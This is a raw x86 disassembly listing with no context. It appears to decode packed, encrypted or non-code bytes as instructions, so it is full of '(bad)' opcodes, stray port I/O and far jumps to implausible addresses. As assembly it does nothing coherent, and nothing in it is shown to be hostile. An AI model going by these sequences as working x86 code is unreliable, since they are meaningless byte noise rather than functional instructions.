  40b069:	mov    dl,0xe3
  40b06b:	or     ch,al
  40b06d:	cmp    DWORD PTR [edx],0xd34cffff
  40b073:	out    0xf7,eax
  40b075:	sbb    al,0xed
  40b077:	and    DWORD PTR [edx+0x1c],ebp
  40b07a:	pop    esp
  40b07b:	ja     0x40b0d9
  40b07d:	pop    ebp
  40b07e:	mov    ah,0x21
  40b080:	mov    ch,0xac
  40b082:	dec    ebp
  40b083:	and    bh,bh
  40b085:	stos   DWORD PTR es:[edi],eax
  40b086:	(bad)  
  40b087:	push   cs
  40b088:	call   0xff62c54a
  40b08d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b08e:	aaa    
  40b08f:	aas    
  40b090:	not    DWORD PTR [ebx+0x7c859025]
  40b096:	and    eax,0x9becff22
  40b09b:	gs pop esp
  40b09d:	fnsave [ebx-0x72934adf]
  40b0a3:	and    bh,bh
  40b0a5:	imul   eax,edi,0x23
  40b0a8:	dec    eax
  40b0a9:	fnsave [ebx+0x7d7cbe2a]
  40b0af:	and    cl,BYTE PTR [ebx]
  40b0b1:	pop    esp
  40b0b2:	lock sti 
  40b0b4:	or     BYTE PTR [ecx+0x43ff1a54],0xc0
  40b0bb:	xchg   edi,eax
  40b0bc:	sldt   WORD PTR [eax]
	...
  40b0e3:	add    BYTE PTR [eax],al
  40b0e5:	add    BYTE PTR [ebx],bh
  40b0e7:	add    al,0x92
  40b0e9:	test   DWORD PTR [ebp+ecx*8+0x20],edx
  40b0ed:	dec    esp
  40b0ef:	pop    ebx
  40b0f0:	mov    ds,WORD PTR [ebp+0x142cb523]
  40b0f6:	daa    
  40b0f7:	hlt    
  40b0f8:	xchg   edi,eax
  40b0f9:	add    eax,0x9ca0ac6c
  40b0fe:	or     ebp,DWORD PTR [ebp-0x531b7ab8]
  40b104:	and    bh,bh
  40b106:	adc    DWORD PTR [edx+eax*1+0x343ea100],esi
  40b10d:	imul   ebx
  40b10f:	or     al,0xb4
  40b111:	addr16 mov dl,0x57
  40b114:	ret    
  40b115:	(bad)  
  40b116:	ficomp DWORD PTR [edx+0x5c]
  40b119:	adc    al,0xcb
  40b11b:	lds    ebx,FWORD PTR [ebp-0x7ea8aedf]
  40b121:	xchg   ebp,eax
  40b122:	mov    ds:0xa18b8dc5,eax
  40b127:	scas   al,BYTE PTR es:[edi]
  40b128:	jge    0x40b14b
  40b12a:	mov    bl,0xd9
  40b12c:	cmp    ebp,DWORD PTR [eax]
  40b12e:	mov    bl,0xc5
  40b130:	jne    0x40b136
  40b132:	adc    ebx,edi
  40b134:	push   ecx
  40b135:	add    al,0x1c
  40b137:	pop    ebx
  40b138:	push   0x5f
  40b13a:	or     ch,0x5d
  40b13d:	and    DWORD PTR [esi+edx*2],ebx
  40b140:	ins    DWORD PTR es:[edi],dx
  40b141:	xchg   edx,eax
  40b142:	sbb    al,0x5b
  40b144:	jmp    0x3df36acd
  40b149:	and    DWORD PTR [eax],eax
	...
  40b173:	jae    0x40b1cf
  40b175:	out    dx,al
  40b176:	xchg   DWORD PTR [ebp-0xbfc16a6],ebx
  40b17c:	push   0xffffffe9
  40b17e:	xor    BYTE PTR [edx+0x440b9bc5],bl
  40b184:	test   al,0x7f
  40b186:	and    DWORD PTR [ebx-0x3b],ecx
  40b189:	pop    ebx
  40b18a:	xor    BYTE PTR [ebx-0x3b],cl
  40b18d:	or     eax,0x1152b121
  40b192:	jmp    0xb271:0x20fdc595
  40b199:	std    
  40b19a:	and    BYTE PTR [ebx],ah
  40b19c:	lds    esi,FWORD PTR [ebx+0xb]
  40b19f:	add    al,0x64
  40b1a1:	and    DWORD PTR [eax],0x13
  40b1a4:	lds    edx,FWORD PTR [ebx-0x2a3aecd9]
  40b1aa:	and    BYTE PTR [ecx-0x69f23ead],cl
  40b1b0:	(bad)  
  40b1b1:	lds    esp,FWORD PTR [eax]
  40b1b3:	test   eax,0xeb20b5a3
  40b1b8:	(bad)  
  40b1b9:	(bad)  
  40b1ba:	cmp    edx,DWORD PTR [eax]
  40b1bc:	mov    bl,0x99
  40b1be:	push   eax
  40b1bf:	cld    
  40b1c0:	ret    
  40b1c1:	(bad)  
  40b1c2:	pop    esp
  40b1c3:	adc    ecx,esp
  40b1c5:	(bad)  
  40b1c6:	sahf   
  40b1c7:	cld    
  40b1c8:	dec    ebp
  40b1c9:	or     BYTE PTR [ecx-0x71011df3],al
  40b1cf:	mov    al,ds:0xfc7ed406
  40b1d4:	ret    
  40b1d5:	push   esp
	...
  40b1ff:	add    BYTE PTR [eax+0x499bcd9],ch
  40b205:	(bad)  
  40b206:	(bad)  
  40b207:	in     eax,0xb2
  40b209:	push   0xffffff8b
  40b20b:	ins    BYTE PTR es:[edi],dx
  40b20c:	dec    ebx
  40b20d:	int3   
  40b20e:	(bad)  
  40b20f:	pop    esi
  40b210:	cmp    al,0x8b
  40b212:	(bad)  
  40b213:	fcom   QWORD PTR [edi]
  40b215:	mov    bl,0x69
  40b217:	jo     0x40b255
  40b219:	(bad)  
  40b21a:	jmp    0x17b4:0xfdc4c1f3
  40b221:	mov    bl,0x5d
  40b223:	push   eax
  40b224:	cmp    al,0xc4
  40b226:	(bad)  
  40b227:	je     0x40b22c
  40b229:	int3   
  40b22a:	(bad)  
  40b22b:	es pop es
  40b22d:	stc    
  40b22e:	fwait
  40b22f:	push   ds
  40b230:	cld    
  40b231:	ret    
  40b232:	mov    ah,0x5
  40b234:	and    al,0xc4
  40b236:	inc    BYTE PTR [ecx]
  40b238:	mov    ah,0xe6
  40b23a:	inc    BYTE PTR [esi]
  40b23c:	cld    
  40b23d:	or     eax,0xc40bf6e8
  40b242:	out    0x65,eax
  40b244:	mov    ds:0x71eefec3,eax
  40b249:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b24a:	mul    dh
  40b24c:	xor    esi,DWORD PTR [ebx-0x3bd48280]
  40b252:	(bad)  
  40b253:	pushf  
  40b254:	inc    esp
  40b255:	int3   
  40b256:	dec    dh
  40b258:	dec    eax
  40b259:	dec    ebp
  40b25a:	pushf  
  40b25b:	add    dl,bl
  40b25d:	arpl   di,di
  40b25f:	mov    ch,0xa5
  40b261:	imul   edi,edi,0xffffffff
	...
  40b28c:	add    BYTE PTR [edx+0x10ff0ae1],ch
  40b292:	push   edi
  40b293:	call   0xffa42b51
  40b298:	push   DWORD PTR [eax+0x6f]
  40b29b:	idiv   edi
  40b29d:	stos   BYTE PTR es:[edi],al
  40b29e:	jbe    0x40b2fa
  40b2a0:	pushf  
  40b2a1:	stos   BYTE PTR es:[edi],al
  40b2a2:	arpl   di,di
  40b2a4:	inc    ebp
  40b2a5:	popf   
  40b2a6:	jne    0x40b275
  40b2a8:	std    
  40b2a9:	sub    ah,BYTE PTR [edi+edi*8+0x75]
  40b2ad:	sub    DWORD PTR [edi+0x76],esi
  40b2b0:	mov    BYTE PTR [ebp-0x763d36a9],al
  40b2b6:	push   edi
  40b2b7:	push   ebp
  40b2b8:	mov    ebx,ecx
  40b2ba:	xlat   BYTE PTR ds:[ebx]
  40b2bb:	ret    
  40b2bc:	cld    
  40b2bd:	pop    edi
  40b2be:	push   edi
  40b2bf:	push   0x1c
  40b2c1:	jmp    0xff46:0x49e806e1
  40b2c8:	(bad)  
  40b2c9:	in     al,dx
  40b2ca:	xchg   ecx,eax
  40b2cb:	cli    
  40b2cc:	push   0x3f9aec
  40b2d1:	or     ah,BYTE PTR [edx+0x578448df]
  40b2d7:	push   DWORD PTR [ebp+0x4d]
  40b2da:	outs   dx,DWORD PTR ds:[esi]
  40b2db:	jb     0x40b2da
  40b2dd:	sub    ah,BYTE PTR [eax+ebp*2-0x47]
  40b2e1:	mov    DWORD PTR [esi+0x574767fe],ebx
  40b2e7:	add    BYTE PTR [eax-0x17f91dd6],al
  40b2ed:	xchg   ebp,eax
  40b2ee:	jp     0x40b2ef
  40b2f0:	inc    DWORD PTR [eax]
	...
  40b31a:	or     ah,ah
  40b31c:	cli    
  40b31d:	push   DWORD PTR [eax+0x4f]
  40b320:	call   0xffa24fa4
  40b325:	leave  
  40b326:	sbb    al,0xf6
  40b328:	push   es
  40b329:	add    BYTE PTR [ecx+0x3d],dl
  40b32c:	das    
  40b32d:	sbb    eax,0xebff1d00
  40b333:	cs add al,0x6a
  40b336:	add    DWORD PTR [ecx],ecx
  40b338:	cwde   
  40b339:	pop    es
  40b33a:	les    edx,FWORD PTR [ebp+edi*2-0x1]
  40b33e:	ror    DWORD PTR [ebx-0x38],cl
  40b341:	sti    
  40b342:	xor    al,0xb8
  40b344:	add    eax,DWORD PTR [eax]
  40b346:	sbb    al,0x37
  40b348:	mov    bh,dh
  40b34a:	mov    edx,0xc4501dd1
  40b34f:	ret    0x85
  40b352:	sbb    al,0xcd
  40b354:	inc    edx
  40b355:	je     0x40b347
  40b357:	push   es
  40b358:	pop    es
  40b359:	add    DWORD PTR [esp+esi*4],ebx
  40b35c:	xchg   ebp,eax
  40b35d:	and    al,0x4
  40b35f:	cmp    DWORD PTR [edi-0x77d0e3c0],0xfffffff7
  40b366:	sub    BYTE PTR [ecx],0x1e
  40b369:	push   eax
  40b36a:	test   BYTE PTR [ecx],cl
  40b36c:	jle    0x40b36d
  40b36e:	jae    0x40b354
  40b370:	stos   BYTE PTR es:[edi],al
  40b371:	jmp    FWORD PTR [ebx+0x11]
  40b374:	pop    ebp
  40b375:	push   eax
  40b376:	arpl   di,di
  40b378:	or     ch,al
  40b37a:	xchg   edx,eax
  40b37b:	jae    0x40b39b
  40b37d:	inc    DWORD PTR [eax]
	...
  40b3a7:	inc    esp
  40b3a8:	adc    BYTE PTR [edx-0x1],bh
  40b3ab:	dec    ebx
  40b3ac:	popa   
  40b3ad:	cwde   
  40b3ae:	sti    
  40b3af:	inc    ebx
  40b3b0:	fisttp WORD PTR [edx]
  40b3b2:	call   0xff5efeca
  40b3b7:	gs jbe 0x40b3c1
  40b3ba:	add    cl,dl
  40b3bc:	dec    esp
  40b3bd:	das    
  40b3be:	sbb    DWORD PTR [eax-0x38],0xffffffa7
  40b3c2:	inc    DWORD PTR [ebp+0x24751d92]
  40b3c8:	pop    ebx
  40b3c9:	rcr    DWORD PTR [ecx-0x5c],1
  40b3cc:	rcr    ebp,0x8b
  40b3cf:	pop    ecx
  40b3d0:	mov    edi,0xb21c0440
  40b3d5:	mov    gs,WORD PTR [edx+edx*8+0x7404281e]
  40b3dc:	mov    dh,0x1c
  40b3de:	ret    
  40b3df:	jecxz  0x40b3a1
  40b3e1:	cmp    ecx,DWORD PTR [esp+eax*8]
  40b3e4:	clc    
  40b3e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3e6:	sbb    eax,0x201bc1d3
  40b3eb:	retf   
  40b3ec:	inc    edi
  40b3ed:	icebp  
  40b3ee:	sub    esp,eax
  40b3f0:	loop   0x40b387
  40b3f2:	sbb    eax,0x3e49ce5
  40b3f7:	dec    ecx
  40b3f8:	(bad)  
  40b3f9:	xchg   esp,eax
  40b3fa:	and    eax,0xffffffa6
  40b3fd:	jne    0x40b41c
  40b3ff:	mov    ds:0xec202bcf,eax
  40b404:	shl    ebx,0xf3
  40b407:	xchg   edx,eax
  40b408:	inc    edi
  40b409:	cmc    
  40b40a:	sub    eax,DWORD PTR [eax]
	...
  40b434:	adc    dl,bl
  40b436:	call   0xe5dbcb3e
  40b43b:	xchg   BYTE PTR [eax+0x5b],dh
  40b43e:	jmp    0x41580f46
  40b443:	add    al,0x1c
  40b445:	pop    ebx
  40b446:	jmp    0x36078d8f
  40b44b:	add    eax,0x3c35b1c
  40b450:	(bad)  
  40b451:	pop    edx
  40b452:	xchg   ebx,eax
  40b453:	add    esi,DWORD PTR [esi+0x4fc76c5a]
  40b459:	sub    ah,BYTE PTR [edi+eax*4+0x30]
  40b45d:	leave  
  40b45e:	or     eax,0x7bc1cc1d
  40b463:	sbb    ebp,DWORD PTR [ebx]
  40b465:	inc    edi
  40b466:	std    
  40b467:	sub    ebx,edx
  40b469:	fcos   
  40b46b:	call   0x7601088f
  40b470:	sbb    dh,BYTE PTR [edx+0x5b1fe8b6]
  40b476:	push   0x1bd79c
  40b47b:	(bad)  
  40b47c:	xchg   edx,eax
  40b47d:	push   eax
  40b47e:	call   0xff0125f9
  40b483:	sbb    DWORD PTR [ebp+0xb648cab],edx
  40b489:	enter  0xb6fe,0x8f
  40b48d:	sub    ch,al
  40b48f:	push   cx
  40b491:	sar    dh,0x70
  40b494:	mov    ds:0x9ef6cb,al
	...
  40b4c1:	and    BYTE PTR [ebx-0x3fe78c24],dh
  40b4c7:	mov    WORD PTR [edi+edi*8-0x39],fs
  40b4cb:	inc    BYTE PTR [esi+0x1df5386f]
  40b4d1:	ffreep st(0)
  40b4d3:	std    
  40b4d4:	cmp    al,0x2f
  40b4d6:	enter  0x6efe,0x30
  40b4da:	inc    esi
  40b4db:	or     al,0x51
  40b4dd:	inc    esp
  40b4de:	fdivp  st(6),st
  40b4e0:	pop    esi
  40b4e1:	xchg   esi,eax
  40b4e2:	(bad)  
  40b4e3:	jecxz  0x40b543
  40b4e5:	sbb    al,al
  40b4e7:	imul   ebp,ecx,0xa85bbec7
  40b4ed:	pop    ds
  40b4ee:	shl    BYTE PTR [ecx+edi*1+0x36fec008],0xb2
  40b4f6:	push   esp
  40b4f7:	call   0xff008725
  40b4fc:	jo     0x40b4a0
  40b4fe:	scas   eax,DWORD PTR es:[edi]
  40b4ff:	neg    BYTE PTR [esi]
  40b501:	and    BYTE PTR ds:0x1e1d8100,dh
  40b507:	inc    ecx
  40b508:	jmp    0x130bb1d
  40b50d:	sub    ah,BYTE PTR [edi+edi*8-0x1]
  40b511:	test   al,0x4f
  40b513:	call   0xffa025bd
  40b518:	mov    DWORD PTR [eax+0x74],edi
  40b51b:	idiv   edi
  40b51d:	add    dh,cl
  40b51f:	(bad)  
  40b520:	addr16 push cs
  40b522:	add    eax,DWORD PTR [eax+0x0]
	...
  40b54d:	add    dl,dl
  40b54f:	sub    eax,esi
  40b551:	mul    edx
  40b553:	arpl   di,di
  40b555:	jne    0x40b548
  40b557:	jae    0x40b4e3
  40b559:	popf   
  40b55a:	mov    ds:0xb1858963,al
  40b55f:	imul   edi,edi,0xffffffff
  40b562:	pop    edi
  40b563:	push   edi
  40b564:	push   0xfe966019
  40b569:	(bad)  
  40b56a:	push   0x92fff767
  40b56f:	arpl   WORD PTR [ebp+0xc],si
  40b572:	popf   
  40b573:	repz fwait
  40b575:	jmp    DWORD PTR [edx+0x2ad884cd]
  40b57b:	jmp    FWORD PTR fs:[edx-0x7b]
  40b57f:	repz push ebx
  40b581:	pop    ebp
  40b582:	inc    esp
  40b583:	push   edi
  40b584:	push   DWORD PTR [ebp-0x941b]
  40b58a:	loop   0x40b575
  40b58c:	or     ch,al
  40b58e:	mov    ecx,0xfcffff42
  40b593:	(bad)  
  40b595:	mul    edx
  40b597:	arpl   WORD PTR [ebx-0x942643],ax
  40b59d:	inc    DWORD PTR [ebp-0x31]
  40b5a0:	ja     0x40b525
  40b5a2:	shl    BYTE PTR [edx-0x9],0xff
  40b5a6:	add    dl,BYTE PTR [edi+0x74]
  40b5a9:	jo     0x40b561
  40b5ab:	and    eax,ebp
  40b5ad:	neg    DWORD PTR [ecx+ebp*2]
  40b5b0:	sbb    eax,DWORD PTR [eax]
	...
  40b5da:	add    BYTE PTR [eax+0x1c0faad8],ch
  40b5e0:	imul   ebx,DWORD PTR [edx-0x1],0xbf2ac9a9
  40b5e7:	mov    dl,0xc5
  40b5e9:	sbb    edi,edi
  40b5eb:	leave  
  40b5ec:	rcl    BYTE PTR [ecx],0xff
  40b5ef:	or     esi,DWORD PTR [esi-0x3e0bf871]
  40b5f5:	jno    0x40b5f6
  40b5f7:	sti    
  40b5f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5f9:	dec    edi
  40b5fa:	call   0xff5a43ea
  40b5ff:	jno    0x40b5cd
  40b601:	sub    al,BYTE PTR ds:0xff19fd8b
  40b607:	xchg   ecx,eax
  40b608:	xchg   esp,eax
  40b609:	adc    edi,edi
  40b60b:	shr    ebp,cl
  40b60d:	dec    edi
  40b60e:	in     al,0xd3
  40b610:	cmc    
  40b611:	sbb    edi,edi
  40b613:	dec    ecx
  40b614:	int3   
  40b615:	sub    al,ch
  40b617:	xchg   edx,eax
  40b618:	in     eax,0x19
  40b61a:	jmp    FWORD PTR [ecx+0xc]
  40b61d:	adc    bh,bh
  40b61f:	stos   DWORD PTR es:[edi],eax
  40b620:	aad    0x8f
  40b622:	pop    es
  40b623:	mov    ah,0xd1
  40b625:	jo     0x40b626
  40b627:	fwait
  40b628:	inc    ebp
  40b629:	push   eax
  40b62a:	fmul   QWORD PTR [ebx+0x11ff1a2d]
  40b630:	int3   
  40b631:	sub    dl,ch
  40b633:	stos   BYTE PTR es:[edi],al
  40b634:	sbb    eax,0x80b1ff1a
  40b639:	adc    bh,bh
  40b63b:	jae    0x40b64a
  40b63d:	nop
  40b63e:	pop    es
	...
  40b667:	add    BYTE PTR [ebp+ebp*2+0x71],dh
  40b66b:	jmp    DWORD PTR [ebx+0x7d]
  40b66e:	push   eax
  40b66f:	in     al,0x53
  40b671:	test   DWORD PTR [edx],ebx
  40b673:	call   0xff5ae1fd
  40b678:	dec    ebx
  40b679:	pop    ebx
  40b67a:	pop    esp
  40b67b:	daa    
  40b67c:	dec    ebx
  40b67d:	mov    esi,0xe49a2b1d
  40b682:	adc    eax,0x108331a
  40b687:	adc    ch,BYTE PTR [ebx]
  40b689:	mov    esi,0xbe857610
  40b68e:	std    
  40b68f:	sbb    ecx,edx
  40b691:	sahf   
  40b692:	std    
  40b693:	sbb    DWORD PTR [ebx],edx
  40b695:	mov    bl,0x60
  40b697:	jl     0x40b6a4
  40b699:	mov    esi,0xc5e44fe5
  40b69e:	fstp   QWORD PTR [ecx]
  40b6a0:	add    al,0x40
  40b6a2:	jo     0x40b6bd
  40b6a4:	repz mov ebp,0xbdf33093
  40b6aa:	lds    ebp,FWORD PTR [esi+ebp*2]
  40b6ad:	in     al,0xbd
  40b6af:	sbb    ebx,ebx
  40b6b1:	pop    es
  40b6b2:	mov    ecx,0xadbdd311
  40b6b7:	(bad)  
  40b6b8:	pop    ss
  40b6b9:	mov    esi,0x55b40c1b
  40b6be:	lahf   
  40b6bf:	sbb    DWORD PTR [ebx-0x54eba443],edi
  40b6c5:	mov    ebp,0xe4522c8d
  40b6ca:	test   DWORD PTR [ecx],ebx
	...
  40b6f4:	add    BYTE PTR [ebx+0x372b8117],ah
  40b6fa:	mov    ebp,0x47931975
  40b6ff:	ins    DWORD PTR es:[edi],dx
  40b700:	sub    al,0xe
  40b702:	fsubr  st,st(0)
  40b704:	add    edx,DWORD PTR [ebp-0x68]
  40b707:	in     al,dx
  40b708:	add    edx,ecx
  40b70a:	rol    DWORD PTR [ebp+eax*4+0x58],1
  40b70e:	mov    esi,0x5df603c2
  40b713:	inc    esi
  40b714:	(bad)  
  40b715:	sbb    esi,DWORD PTR [ebx-0x42a48e30]
  40b71b:	call   FWORD PTR [edi-0x6d]
  40b71e:	shl    DWORD PTR [edi-0x31],0x92
  40b722:	sbb    al,BYTE PTR [eax]
  40b724:	es push ebx
  40b726:	mov    edx,0xbe1fa847
  40b72b:	je     0x40b70e
  40b72d:	pop    es
  40b72e:	fwait
  40b72f:	cld    
  40b730:	push   cs
  40b731:	add    eax,0x5ea41e33
  40b736:	mov    ebp,0x5b1feb66
  40b73b:	xor    dh,0xa2
  40b73e:	push   esp
  40b73f:	call   0xfefcea83
  40b744:	out    0x92,al
  40b746:	sar    dh,0x54
  40b749:	sub    BYTE PTR [ebx-0x43eb8086],dh
  40b74f:	enter  0xebab,0xbc
  40b753:	push   ebx
  40b754:	jb     0x40b791
  40b756:	fadd   st,st(3)
  40b758:	mov    ebp,0x0
	...
  40b781:	add    BYTE PTR [ebp-0x7e1695db],cl
  40b787:	pop    esp
  40b788:	push   DWORD PTR [eax+ebx*1]
  40b78b:	mov    bl,0x1c
  40b78d:	jg     0x40b7b3
  40b78f:	mov    esp,0xd0142488
  40b794:	xor    al,0xc
  40b796:	loopne 0x40b7b3
  40b798:	add    BYTE PTR [edx-0x2e],ah
  40b79b:	xor    ecx,DWORD PTR [eax+0x28]
  40b79e:	sbb    bl,bl
  40b7a0:	ds jmp 0x5a8f351
  40b7a6:	retf   
  40b7a7:	sbb    eax,DWORD PTR [eax]
  40b7a9:	pop    ss
  40b7aa:	cmp    BYTE PTR [ecx+0x2b1fe985],al
  40b7b0:	push   0x1bb2c9
  40b7b5:	mov    esi,0xe9856d47
  40b7ba:	pop    ds
  40b7bb:	and    DWORD PTR [ebx],ecx
  40b7bd:	add    BYTE PTR ds:0x370b02cd,dh
  40b7c3:	int3   
  40b7c4:	sub    BYTE PTR [esi-0x23],dl
  40b7c7:	in     al,0xa0
  40b7c9:	(bad)  
  40b7ca:	cli    
  40b7cb:	out    dx,eax
  40b7cc:	jbe    0x40b82b
  40b7ce:	je     0x40b828
  40b7d0:	push   eax
  40b7d1:	call   0x3ffb8c
  40b7d6:	jne    0x40b7c8
  40b7d8:	(bad)  
  40b7d9:	jmp    FWORD PTR [edx]
  40b7db:	and    ebp,DWORD PTR [eax+0x73]
  40b7de:	js     0x40b779
  40b7e0:	dec    BYTE PTR [edi+0x1a]
  40b7e3:	into   
  40b7e4:	push   es
  40b7e5:	call   0x40b7ea
	...
  40b80e:	add    BYTE PTR [ebx+0x1dffff19],cl
  40b814:	fist   DWORD PTR [edi+0x16ffaff]
  40b81a:	inc    esi
  40b81b:	test   DWORD PTR [ebp-0x3308b02],esp
  40b821:	cli    
  40b822:	xor    esi,DWORD PTR [ebp-0x250000e3]
  40b828:	arpl   dx,si
  40b82a:	scas   al,BYTE PTR es:[edi]
  40b82b:	sbb    eax,0x8a9f73bc
  40b830:	jmp    0x4f51b82f
  40b835:	call   0xffa4f91d
  40b83a:	pop    edi
  40b83b:	sti    
  40b83c:	or     eax,0xac504c2
  40b841:	mov    ch,ah
  40b843:	ss sbb edi,esp
  40b846:	jmp    DWORD PTR [eax-0x728a00ad]
  40b84c:	outs   dx,DWORD PTR ds:[esi]
  40b84d:	cli    
  40b84e:	xchg   edx,eax
  40b84f:	or     ah,BYTE PTR [ecx+ecx*4+0x45]
  40b853:	stc    
  40b854:	arpl   WORD PTR [ebp-0x4],si
  40b857:	cli    
  40b858:	jmp    0x47a0a063
  40b85d:	(bad)  
  40b85e:	call   FWORD PTR [ecx+edi*1]
  40b861:	leave  
  40b862:	or     edx,DWORD PTR [edi]
  40b864:	jb     0x40b7f6
  40b866:	inc    ecx
  40b867:	lahf   
  40b868:	pop    edx
  40b869:	add    al,0x74
  40b86b:	sbb    DWORD PTR [ebp-0x6f],edi
  40b86e:	sti    
  40b86f:	inc    esp
  40b870:	lock jp 0x40b872
	...
  40b89b:	add    BYTE PTR [ebx-0x1f],cl
  40b89e:	adc    eax,0x91751075
  40b8a3:	sti    
  40b8a4:	int3   
  40b8a5:	pop    esp
  40b8a6:	xchg   ecx,eax
  40b8a7:	pop    es
  40b8a8:	inc    esp
  40b8a9:	(bad)  
  40b8ab:	jmp    FWORD PTR [ebx]
  40b8ad:	pop    es
  40b8ae:	mov    cl,BYTE PTR [ebp+0x10]
  40b8b1:	xor    ebp,ebx
  40b8b3:	call   DWORD PTR [eax+0x21e7b0ae]
  40b8b9:	or     al,0x17
  40b8bb:	push   DWORD PTR [edi]
  40b8bd:	test   BYTE PTR [ebx],ch
  40b8bf:	adc    al,0x9f
  40b8c1:	aas    
  40b8c2:	hlt    
  40b8c3:	jmp    FWORD PTR [edi-0x54]
  40b8c6:	mov    DWORD PTR [ebp+0xc],eax
  40b8c9:	xchg   ecx,eax
  40b8ca:	(bad)  
  40b8cb:	sti    
  40b8cc:	fwait
  40b8cd:	les    ecx,FWORD PTR [ecx-0x1639083e]
  40b8d3:	mov    edi,0x706e5
  40b8d8:	imul   edi,DWORD PTR ds:0x9851ff27,0xcc147515
  40b8e2:	test   DWORD PTR [edx+0x7515d9bb],edx
  40b8e8:	and    BYTE PTR [edi+edx*1+0x75],dh
  40b8ec:	adc    al,0xdc
  40b8ee:	std    
  40b8ef:	xchg   edx,eax
  40b8f0:	mov    ds:0x24c24be1,eax
  40b8f5:	les    ebp,FWORD PTR [edi+0x3f45808a]
  40b8fb:	shl    dl,0x50
  40b8fe:	mov    bl,0x82
	...
  40b928:	add    BYTE PTR [ecx],al
  40b92a:	pop    ebx
  40b92b:	icebp  
  40b92c:	add    esi,eax
  40b92e:	dec    esp
  40b92f:	push   0xffffff98
  40b931:	daa    
  40b932:	pop    ebx
  40b933:	fld    QWORD PTR [edi]
  40b935:	lahf   
  40b936:	cmp    cl,bh
  40b938:	add    ebp,eax
  40b93a:	pusha  
  40b93b:	push   0xffffff98
  40b93d:	das    
  40b93e:	pop    ebx
  40b93f:	mov    ah,0xc
  40b941:	pop    es
  40b942:	fwait
  40b943:	xchg   ecx,eax
  40b944:	mov    dh,0xe9
  40b946:	mov    ds:0xe543f32a,eax
  40b94b:	stos   DWORD PTR es:[edi],eax
  40b94c:	pop    es
  40b94d:	lahf   
  40b94e:	mov    ebx,0x66b182e5
  40b953:	jmp    0x29a6d8e7
  40b958:	(bad)  
  40b959:	adc    al,0x86
  40b95b:	sub    DWORD PTR [edx+0x4130197a],edi
  40b961:	sub    al,0x5b
  40b963:	(bad)  
  40b964:	shr    BYTE PTR [edi],0xde
  40b967:	or     dh,bh
  40b969:	sahf   
  40b96a:	aaa    
  40b96b:	std    
  40b96c:	add    esi,DWORD PTR [eax+0x5f]
  40b96f:	repnz inc ebx
  40b971:	push   0x47440264
  40b976:	sbb    ch,BYTE PTR [edi]
  40b978:	dec    ebx
  40b979:	fimul  WORD PTR [edx-0x17]
  40b97c:	call   0x8747377
  40b981:	mov    ds:0x6181a91f,eax
  40b986:	fwait
  40b987:	loope  0x40b99d
  40b989:	dec    ecx
  40b98a:	fwait
  40b98b:	nop
  40b98c:	call   0x0:0x0
	...
  40b9b3:	add    BYTE PTR [eax],al
  40b9b5:	add    BYTE PTR [edx-0x5ae76247],dl
  40b9bb:	pop    ds
  40b9bc:	lods   eax,DWORD PTR ds:[esi]
  40b9bd:	mov    DWORD PTR [ecx],ebp
  40b9bf:	lahf   
  40b9c0:	dec    esi
  40b9c1:	add    BYTE PTR [ecx+0x1c],0xe9
  40b9c5:	pop    edx
  40b9c6:	daa    
  40b9c7:	pop    ebx
  40b9c8:	jmp    0x3f48d0
  40b9cd:	popa   
  40b9ce:	fwait
  40b9cf:	popa   
  40b9d0:	mov    ebx,DWORD PTR [esp+edx*1]
  40b9d3:	scas   al,BYTE PTR es:[edi]
  40b9d4:	mov    ds:0x4fc9bb74,eax
  40b9d9:	pop    esi
  40b9da:	mov    ds:0x2bdcfef9,eax
  40b9df:	ret    
  40b9e0:	jbe    0x40b96a
  40b9e2:	or     DWORD PTR [edx-0x3ce44302],edi
  40b9e8:	xor    BYTE PTR [esi+0x29],dl
  40b9eb:	mov    edx,0xea23bcfe
  40b9f0:	inc    esp
  40b9f1:	sub    DWORD PTR [ebp+0x1102c01f],ebx
  40b9f7:	xor    al,al
  40b9f9:	adc    DWORD PTR [edx-0x30],esp
  40b9fc:	(bad)  
  40b9fd:	push   ss
  40b9fe:	xchg   edi,eax
  40b9ff:	pop    ds
  40ba00:	les    ecx,FWORD PTR ds:0x74c41f97
  40ba06:	stos   DWORD PTR es:[edi],eax
  40ba07:	enter  0x7c8a,0x53
  40ba0b:	repnz (bad)
  40ba0e:	pop    ds
  40ba0f:	pop    ebx
  40ba10:	repz inc ebp
  40ba12:	push   0xffffffdd
  40ba14:	pop    esp
  40ba15:	sub    BYTE PTR [eax],ah
  40ba17:	repnz or ch,cl
	...
  40ba42:	add    BYTE PTR [edi],bl
  40ba44:	pop    ebx
  40ba45:	repz lea edx,[esi+ebp*1+0x64da6208]
  40ba4d:	repz lea esp,[edx+0x2919e01e]
  40ba54:	shl    BYTE PTR cs:[esi+0x7e79c9a],0x3f
  40ba5c:	mov    eax,0x9caaa6fe
  40ba61:	out    0x89,eax
  40ba63:	inc    ecx
  40ba64:	mov    eax,0x2ea295fe
  40ba69:	lock pop esp
  40ba6b:	mov    ah,BYTE PTR [eax+0x5c7500b8]
  40ba71:	add    BYTE PTR [eax],al
  40ba73:	push   ss
  40ba74:	sbb    BYTE PTR [ebp+0x8159575],cl
  40ba7a:	add    BYTE PTR [ebp+0x5c],dh
  40ba7d:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba7f:	dec    edi
  40ba80:	pop    ebp
  40ba81:	lea    eax,[ebp+0x2d]
  40ba84:	in     al,dx
  40ba85:	out    0x68,al
  40ba87:	xchg   edi,eax
  40ba88:	pop    esp
  40ba89:	add    BYTE PTR [ebx+0x7d89ac48],cl
  40ba8f:	jns    0x40baae
  40ba91:	out    dx,eax
  40ba92:	add    ecx,DWORD PTR [esi+0x4f]
  40ba95:	je     0x40bafe
  40ba97:	ficomp WORD PTR [esi-0x73]
  40ba9a:	inc    ebp
  40ba9b:	fucomp st(3)
  40ba9d:	push   esp
  40ba9e:	push   esi
  40ba9f:	or     eax,0x4500a455
  40baa4:	fcmovnb st,st(5)
  40baa6:	or     BYTE PTR [eax],al
	...
  40bad0:	and    BYTE PTR [ebx-0x1],0x75
  40bad4:	and    BYTE PTR [esi+esi*4+0x46],bl
  40bad8:	and    bl,bl
  40bada:	test   DWORD PTR [eax],0xf02b5a8a
  40bae0:	fsubp  st(0),st
  40bae2:	push   cs
  40bae3:	rol    DWORD PTR [ebx],1
  40bae5:	add    edi,edi
  40bae7:	imul   eax,DWORD PTR ds:0x569fed6,0xe575fdf2
